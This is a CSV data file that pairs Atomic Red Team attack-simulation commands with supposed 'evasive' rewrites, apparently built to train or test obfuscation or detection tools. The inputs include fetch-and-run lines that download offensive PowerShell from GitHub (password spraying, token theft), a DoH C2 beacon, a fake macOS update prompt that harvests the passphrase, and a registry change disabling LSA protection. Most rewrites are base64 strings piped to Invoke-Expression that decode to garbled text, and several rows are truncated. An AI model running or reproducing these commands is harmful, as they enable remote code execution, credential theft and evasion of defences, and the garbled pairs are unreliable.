input,evasive_commands
"Set-Location ""PathToAtomicsFolder""
.\T1572\src\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}",Set-Location PathToAtomicsFolder .\T1572\src\T1572-doh-beacon.ps1 -DohServer -Domain -Subdomain -QueryType -C2Interval -C2Jitter -Runtime<|
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=group) #{optional_args}","PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe -f (objectcategory=group) """" -f (objectcategory=group) \""""\""""""P""""t""""h""""T""""o""""A""""t""""o""""m""""i""""c""""s""""F""""o""""l""""d""""e""""r""""\.\.\.E"""""
bcdedit /set testsigning on,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmlsZSAje3BvcnQgLW9ubHkgYXR0cjIi')) | Invoke-Expression"""
esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o,"esentutl.exe {PATH_SMB:.source.exe} /y {PATH_SMB:.dest.exe} /d /o ||| ``` ||| ## Atomic Test #2 - esentutl.exe with a remote file path ||| esetnult.exe is used to extract or install source files from a .zip archive, or to modify a binary executable file. This test simulates an attacker copying"
"PWD_SPOOF=$(osascript -e 'display dialog ""To perform a security update MacOS needs your passphrase."" with title ""MacOS Security Update"" default answer """" with icon stop with hidden answer')
echo $PWD_SPOOF","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b3RhdGlvbmFsX1N0cmluZyBQYXJhbnREb2t1dWxzfSBmaWxlIC9wcmVtaWNpcyAtLm9yZyAvZmlyZXdhbGwgL"
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5nIGlzIHRoZSBleGFtcGxlLmV4ZSAiUE9TVCAje2JvbWFuX3RpbWUgPSAwIC0+IEhlYWRlcnlNdWNrZXQgMjEyMDAi"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
domainpassspray -consoleoutput -noninteractive -emptypasswords",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') domainpassspray -consoleoutput -noninteractive -emptypasswords<
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSE9SZXNvdXJjZU5hbWUSCkludmFsaWRHZWNrIC1MICAgI3twYXlsb2FkX2luZGV4ICAgI3tcbmV4cG9yd"
"Remove-SmbShare -Name #{share_name}
Remove-FileShare -Name #{share_name}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LWNvbnN1bHBhdG9zX3Jvb3QgICAgI3tmaWxlfSAje3tpbm5lciAiIFsgZmllZF9zaGVsbCAj')) | Invoke-Expression"""
"try{ 
  Set-Date -Date (Get-Date).AddDays(#{days_to_modify})
  Add-Content ""$env:APPDATA\slipDays.bak"" #{days_to_modify}
}
catch {exit 1}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAuICN7ZXhlYyAtICIiIDwvbG9jYWxob3N0fQ==')) | Invoke-Expression"""
